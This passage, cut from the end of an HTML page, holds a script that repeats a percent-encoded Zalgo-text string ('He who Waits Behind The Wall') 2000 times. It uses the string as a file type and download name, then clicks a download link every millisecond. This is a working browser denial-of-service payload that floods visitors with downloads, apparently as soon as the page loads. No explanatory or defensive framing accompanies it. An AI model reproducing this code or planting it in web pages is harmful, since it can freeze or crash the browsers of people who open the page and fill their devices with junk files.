C%AB%CC%A3%CD%9As%CC%87%CC%93%CC%8D%CD%82%CC%88%CC%B6%CC%B4%CD%93%CC%AF%CC%A6%CC%97%CC%A4%CD%93%CC%BC%CD%99%CC%A5%CC%96%CC%AA.%CC%85%CC%BD%CC%8E%CD%86%CD%A7%CC%80%CC%85%CC%92%CD%A7%CC%8C%CC%83%CD%91%CC%82%CC%B8%CC%9B%D2%89%CD%8D%CC%AF%CC%9D%CC%9C%CC%96%CD%88%CC%AD%CC%96%CC%BB%CC%9E%20%CC%80%CC%80%CD%83%CC%B6%CD%8F%CC%98%CC%AF%CC%B2%CC%97%CC%B2%CC%97%CD%96%CD%9A%CC%AB%CD%95Z%CC%8A%CD%91%CC%8E%CD%9B%CD%83%CD%86%CC%BF%CD%9C%CD%9D%D2%89%CD%8D%CC%A0%CC%B2%CC%9E%CD%93%CC%AB%CC%BA%CD%93%CD%96%CC%9D%CC%9D%CC%A9%CC%A4%CD%8D%CC%A0%CC%A5%CC%A4a%CD%A3%CD%AD%CC%81%CD%AA%CD%AC%CD%AF%CD%8B%CD%83%CC%85%CD%AB%CD%A9%CC%86%CC%93%CC%B4%CC%B7%CC%A2%CD%A2%CC%AB%CC%9F%CC%A3%CD%85%CC%BB%CC%BC%CC%9C%CD%93%CC%B3%CD%94%CC%A3%CD%94%CC%A4%CC%BA%CD%85%CC%98l%CD%90%CD%92%CC%8A%CD%AC%CD%AC%CD%8A%CC%83%CD%97%CD%A6%CD%A4%CD%83%CD%AC%CD%A6%CD%A4%CD%86%CD%A1%CC%A8%CD%99%CC%B3%CC%98%CC%A4%CD%89%CC%AF%CD%99%CC%AEg%CC%8C%CC%80%CD%8A%CD%A4%CD%97%CC%92%CC%88%CC%83%CC%8F%CC%87%CC%B7%CC%B1%CC%9D%CD%85%CC%B0%CD%85%CD%85%CD%87%CD%8D%CC%A6o%CD%A8%CC%8A%CC%9A%CC%94%CD%82%CC%92%CD%AF%CC%8B%CD%8A%CD%83%CD%97%CD%86%CC%8A%CD%A4%CD%8F%CC%B6%CD%A1%CD%9C%CD%85%CC%B3%CD%87%CD%85%CC%BC%CC%B2.%CC%8E%CC%8C%CC%8D%CD%8B%CD%8F%CC%9B%CD%8F%CD%A1%CC%96%CD%96%CC%A9%CC%AD%CC%A4%CC%AB%CC%9F%CC%96%CD%95%CD%93%CD%8D%CD%93%0A%CC%8D%CD%AE%CC%8E%CC%88%CC%80%CC%83%CC%8F%CC%88%CC%84%CC%81%CD%A4%CC%8A%CC%B6%CC%B5%CD%9D%CC%B4%CC%A1%CD%89%CC%9C%CC%A5%CC%99%CC%BB%CD%94%CC%AC%CD%88%CD%94%CC%A9%CD%96H%CC%94%CD%AD%CC%84%CC%89%CC%91%CD%86%CC%82%CD%A8%CC%89%CD%A8%CC%87%CC%BD%CD%9B%CC%B8%CC%A7%CC%98%CC%BC%CC%AA%CC%AD%CC%AB%CC%AE%CC%A0e%CD%AF%CC%82%CC%90%CD%A8%CD%A6%CC%90%CD%A9%CC%87%CD%8A%CD%A4%CD%AD%CC%9B%CC%B8%CC%B3%CD%95%CC%98%CD%88%CD%99%20%CC%8E%CD%A6%CC%8B%CD%A7%CC%8A%CC%87%CD%A4%CC%BE%CC%8F%CD%8A%CD%91%CD%A8%CD%86%CC%8C%CC%92%CC%A2%CD%81%CC%B4%CD%9C%CD%8F%CC%A3%CD%88%CC%B1%CD%9A%CD%89%CC%A0w%CD%83%CD%A7%CD%92%CD%97%CD%82%CD%A7%CD%92%CC%81%CC%85%CC%95%CC%95%CD%A0%CD%9E%CC%A8%CC%B9%CC%99%CC%AE%CD%93%CC%B1%CD%95%CC%BC%CC%AF%CD%94%CC%AB%CC%BB%CD%96%CC%B1%CC%B0%CD%93%CD%93h%CD%AD%CC%BE%CD%AD%CC%88%CD%80%CD%96%CC%BB%CC%A3%CC%BB%CC%9D%CC%AC%CC%B0%CC%9D%CD%8E%CC%AA%CD%89%CC%9D%CC%ABo%CD%8A%CC%BD%CC%9A%CC%86%CD%84%CD%81%CC%A2%CC%B4%CD%93%CD%89%CD%8D%CC%AD%CC%AA%CD%94%CD%93%CC%AF%CC%A4%CC%A6%CD%87%CC%AE%CC%AA%CC%A9%CC%A3%CC%99%CC%99%20%CD%8A%CD%A6%CC%BF%CC%8E%CD%AC%CD%AF%CD%A4%CD%86%CC%BE%CD%AE%CC%9A%CC%85%CD%8A%CC%86%CD%AA%CD%8C%CD%A7%CD%82%CD%84%CD%8F%CD%A0%CC%A0%CD%88%CC%9C%CC%96%CC%AB%CC%AF%CD%8E%CC%B1%CC%AC%CC%BB%CC%9F%CC%97%CC%A3%CC%B2W%CD%8C%CD%91%CD%86%CC%82%CD%91%CC%BF%CD%86%CD%9D%CC%A2%CD%8F%CC%B3%CD%99%CC%A6%CC%BB%CC%A4%CC%A3%CC%B3%CC%A6%CC%99%CC%9C%CC%A5%CC%BB%CD%93%CC%BB%CD%99a%CD%97%CC%8E%CD%83%CC%9A%D2%89%CC%A1%CC%B5%CC%A1%CD%88%CD%8D%CD%8D%CD%94%CC%B2%CD%89%CC%B0%CC%A0%CC%9C%CC%9E%CC%A0%CC%9C%CC%B2i%CD%82%CD%86%CC%80%CD%8A%CD%AC%CD%AA%CD%AF%CC%8D%CD%81%D2%89%CD%9F%CC%A4%CC%A3%CD%93%CD%87%CC%97%CC%A0%CD%85t%CC%87%CC%89%CD%A5%CC%84%CC%8F%CC%84%CC%8C%CD%8C%CD%A9%CC%91%CC%BF%CD%8C%CC%B8%CC%95%CD%9C%CD%A0%CD%8E%CC%99%CC%AF%CD%96%CC%BC%CD%85%CC%A9%CC%AC%CC%AF%CC%9Ds%CC%88%CC%BE%CD%A6%CD%A9%CC%BF%CC%88%CC%85%CD%8C%CD%86%CD%A4%CD%AA%CD%8B%CC%89%CC%88%CD%81%CC%A8%CD%A0%CD%9C%CC%B7%CD%88%CD%9A%CC%B1%CD%95%CD%99%CD%8E%CC%AF%CC%97%CD%95%CD%8D%CC%BB%CD%85%CC%A6%CC%9E%20%CC%BF%CD%8B%CD%A5%CD%A4%CC%84%CC%85%CC%81%CD%AC%CD%8A%CC%91%CC%82%CD%AC%CD%82%CD%82%CD%A8%CD%AD%CD%A1%CC%A8%CC%96%CC%A9%CD%89%CD%85%CC%B2B%CD%83%CC%80%CC%9A%CD%92%CC%8F%CD%91%CD%83%CC%94%CD%A9%CD%A3%CD%9E%CC%9B%D2%89%CC%9B%CC%B0%CC%A9%CC%A9%CC%AE%CD%94%CC%BBe%CC%85%CD%90%CD%97%CC%93%CD%84%CD%A6%CD%AC%CC%8E%CC%80%CC%A2%CC%B8%CC%B7%CD%9D%CD%9F%CC%AA%CC%AF%CC%B1%CD%87%CD%95%CC%99%CC%9E%CD%87%CC%A0%CC%BB%CD%95%CC%98%CC%B0%CC%AFh%CD%AE%CC%82%CD%A5%CD%A7%CC%8B%CD%AF%CD%A3%CC%84%CC%87%CD%90%CC%82%CC%8E%CD%84%CD%82%CC%83%CC%A1%CD%81%CD%9E%CC%A5%CD%93%CD%94%CD%85%CC%A6%CD%8Di%CD%90%CC%8F%CD%AF%CC%86%CC%8E%CD%83%CD%A1%D2%89%CC%A6%CC%AF%CC%96%CC%AE%CC%9D%CC%A0%CC%B3%CC%BB%CD%9A%CC%A0%CD%85%CC%A9%CC%BC%CC%BC%CC%9En%CD%82%CD%A9%CC%94%CD%AB%CD%AC%CC%8D%CC%90%CC%92%CC%91%CD%97%CD%9B%CD%AC%CC%9A%CD%AE%CC%82%CD%AC%CC%B8%CD%81%CD%A0%CC%BA%CD%94%CC%A5%CC%B1%CD%8D%CC%B9%CC%A4d%CD%A7%CD%A9%CC%81%CC%90%CC%BD%CC%87%CD%84%CC%88%CC%82%CD%AC%CC%80%CC%87%CC%BE%CC%91%CC%A1%CC%B7%CD%94%CD%8E%CC%9E%CC%9C%CD%95%CD%8E%CC%A6%CD%94%CC%B2%CD%88%CC%A9%CD%88%CD%8D%CC%A5%20%CC%92%CD%AA%CD%AC%CD%AC%CC%A7%CD%81%CC%B5%CC%BA%CC%B9%CD%88%CC%A6%CD%8E%CC%AA%CD%96%CC%A6%CC%B9%CD%87%CC%B1%CC%B3%CC%AC%CD%8E%CC%96%CC%BC%CC%9E%CC%A6T%CD%91%CC%89%CD%86%CD%A4%CC%8A%CD%8B%CD%A5%CC%83%CD%A8%CD%A6%CD%A5%CC%80%CD%92%CC%BF%CD%AA%CD%82%CD%92%CC%87%CD%8C%CD%8F%CC%A8%CD%9F%CC%BA%CC%B3%CC%A6%CC%A9%CC%BB%CC%B0%CC%97%CC%B2%CC%B0%CC%AD%CC%A6%CC%98%CC%B1%CC%BC%CD%88%CC%A3%CD%9Ah%CD%A4%CD%A3%CC%82%CD%AE%CC%BE%CD%AE%CD%A4%CC%91%CC%BD%CC%BF%CC%94%CD%AE%CC%82%CC%85%CD%92%CC%83%CC%8B%CC%8B%D2%89%CC%B4%CC%A3%CC%B3%CC%97%CC%AC%CC%B3%CD%8D%CD%87%CC%A6%CC%A4e%CC%84%CC%80%CC%83%CC%93%CC%86%CC%BF%CD%AB%CC%80%CD%AD%CC%8A%CD%A1%CC%A4%CC%BA%CD%99%CC%BA%CC%9F%CC%AC%CC%A0%CC%B9%CC%AA%CC%BA%CC%AC%CC%A5%CC%97%CC%98%CD%93%20%CC%9A%CC%8E%CD%92%CC%85%CC%8D%CD%8C%CC%86%CC%91%CD%8B%CC%82%CD%A3%CD%83%CC%82%CC%82%CC%B7%CD%8F%CD%8E%CD%8D%CC%AA%CD%9A%CD%8D%CC%9C%CC%98%CD%88%CC%A0%CD%9A%CC%A9%CC%B0%CC%A4%CC%BA%CD%94%CC%A0W%CC%86%CD%A4%CC%82%CD%80%CC%B8%CD%A1%CC%BA%CD%94%CD%85%CC%AB%CD%8D%CC%AF%CC%AE%CD%85%CC%A3%CC%97%CC%99%CC%98%CC%AE%CC%AE%CC%96%CD%88%CD%8D%CC%9Da%CD%AD%CC%82%CD%82%CD%8C%CD%A7%CC%89%CC%80%CC%8B%CD%A9%CC%81%CD%91%CD%AF%CC%84%CC%80%CD%A5%CC%82%CC%81%CC%BE%CC%88%CD%A0%CC%B6%CC%A7%CC%95%CC%B6%CC%9C%CC%9F%CC%9F%CC%B0%CD%93%CD%87l%CC%85%CC%89%CD%90%CC%91%CC%8A%CD%A7%CD%86%CD%92%CD%82%CD%A9%CC%9A%CD%92%CC%9B%D2%89%CC%9D%CC%B3%CC%97%CC%9C%CC%9Fl%CD%84%CC%BE%CC%8F%CD%8A%CC%81%CD%82%CC%80%CC%90%CC%8A%CC%B7%CC%B8%CD%81%CD%93%CC%A5%CC%AE%CC%B0.%CC%86%CC%90%CC%87%CC%84%CC%8F%CC%82%CD%8A%CD%91%CD%97%CC%90%CD%A1%CC%A0%CC%96%CC%99%CD%8E%CC%98%CC%A5%CC%99%CC%98%CC%AD%0A%CC%9A%CC%90%CD%AE%CC%89%CC%8A%CD%AF%CD%86%CD%AB%CC%83%CD%84%CD%83%CC%8D%CC%8E%CD%A3%CD%A3%CD%AD%CD%8F%CD%80%CC%A2%CC%A8%CD%8E%CC%A5%CC%B0%CD%8E%CC%A4%CC%AF%CC%9EZ%CC%87%CC%85%CC%8B%CD%A6%CD%AB%CD%A4%CC%86%CC%BD%CD%AF%CD%AA%CC%93%CC%88%CC%80%CC%B6%CC%A1%CC%B7%CD%A0%CC%A6%CC%AD%CC%BC%CC%9E%CC%A4%CC%97%CC%B2%CC%99%CC%A6%CC%A0%CC%A5%CC%AB%CD%88%CC%B3A%CD%AD%CC%8B%CD%A5%CC%84%CD%A3%CD%82%CD%8C%CD%86%CD%8C%CC%86%CD%83%CC%85%CC%85%CC%BE%CD%A5%CD%AD%CC%A8%CD%8F%CC%9D%CC%AF%CC%AD%CC%AF%CD%95%CD%99%CC%A0%CC%BC%CC%B1%CC%96%CD%8E%CC%ACL%CD%AC%CC%8D%CC%8D%CD%9B%CD%AA%CC%89%CD%A5%CC%A8%CD%81%CD%9E%CD%99%CC%9C%CC%AA%CD%93%CC%BB%CC%AE%CD%8E%CC%B9%CC%BC%CC%AA%CC%AC%CC%98%CC%A5%CC%9D%CD%9A%CC%AEG%CD%9B%CD%83%CD%AA%CD%97%CD%AF%CD%8C%CD%82%CD%84%CC%95%CC%9B%CC%A2%CD%8D%CC%AE%CC%9D%CC%BC%CD%8D%CC%B3%CD%96%CC%B3%CC%AB%CC%A9%CD%95%CC%AE%CC%A4%CD%88%CC%B3%CC%A3%CC%AFO%CD%AF%CC%89%CD%A4%CD%86%CC%80%CD%A4%CD%83%CD%97%CD%8A%CD%84%CC%8F%CC%84%CD%92%CD%80%D2%89%CC%A8%CC%A1%CD%81%CC%BA%CC%98%CC%A5%CC%B0%CD%94%CC%9F%CD%87!%CC%BF%CC%80%CD%A8%CC%8C%CC%85%CC%93%CD%90%CD%A3%CD%86%CC%8E%CC%93%CC%89%CD%8C%CC%85%CD%92%CD%9B%CC%85%CD%8A%D2%89%CD%9C%CD%9F%CC%9B%CC%AB%CC%AC%CC%AC%CC%B3%CD%93%CC%AA%CC%B1%CC%9E%CC%9D').repeat(2000);

const blob = new Blob([], {type: payload});

const a = document.createElement('a');

document.body.appendChild(a);

a.download = payload;

a.href = window.URL.createObjectURL(blob);

setInterval(() => a.click(), 1);

</script>


</body>
</html>
